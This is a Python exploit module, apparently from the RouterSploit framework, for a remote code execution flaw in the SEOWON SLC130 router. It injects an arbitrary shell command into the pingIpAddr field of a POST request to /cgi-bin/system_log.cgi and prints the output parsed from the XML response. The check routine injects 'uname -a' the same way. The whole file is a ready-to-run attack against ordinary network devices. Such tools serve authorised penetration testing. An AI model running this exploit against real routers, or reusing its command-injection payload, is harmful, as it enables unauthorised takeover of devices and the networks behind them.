from routersploit.core.exploit import *
from routersploit.core.http.http_client import HTTPClient
import xml.etree.ElementTree as et


class Exploit(HTTPClient):
    __info__ = {
        "name": "SEOWON SLC130",
        "description": "SEOWON SLC130 Remote Code Execution",
        "authors": (
            "Koorosh Ghorbani",
        ),
        "references": (
            "https://cxsecurity.com/issue/WLB-2018110255",
        ),
        "devices": (
            "SLC130",
        ),
    }

    target = OptIP("", "Target IPv4 or IPv6 address")
    port = OptPort(443, "Target HTTP port")
    cmd = OptString('ls -la', 'command to execute')

    def run(self):
        if self.check() is False:
            print_error("Not Vulnerable")
            return
        payload = {
            "Command": "Diagnostic",
            "traceMode": "ping",
            "reportIpOnly": "",
            "pingIpAddr": "127.0.0.1 -c 1 | " + self.cmd,
            "pingPktSize": "56",
            "pingTimeout": "30",
            "pingCount": "4",
            "maxTTLCnt": "30",
            "queriesCnt": "3",
            "reportIpOnlyCheckbox": "on",
            "btnApply": "Apply",
            "T": 1543994897367
        }
        print_status("Sending payload to the target")
        response = self.http_request(
            method="POST",
            path="/cgi-bin/system_log.cgi?",
            data=payload
        )
        if response and response.status_code == 200:
            print_status("Extracting Data")
            root = et.fromstring(response.text)
            for log in root.iter('log'):
                print_info(log.text)
            print_status("Finished")
        else:
            print_error("invalid http response code")

    @mute
    def check(self):
        payload = {
            "Command": "Diagnostic",
            "traceMode": "ping",
            "reportIpOnly": "",
            "pingIpAddr": "127.0.0.1 -c 1 | uname -a",
            "pingPktSize": "56",
            "pingTimeout": "30",
            "pingCount": "4",
            "maxTTLCnt": "30",
            "queriesCnt": "3",
            "reportIpOnlyCheckbox": "on",
            "btnApply": "Apply",
            "T": 1543994897367
        }
        response = self.http_request(
            method="POST",
            path="/cgi-bin/system_log.cgi?",
            data=payload
        )
        if response and "Linux" in response.text:
            return True
        return False
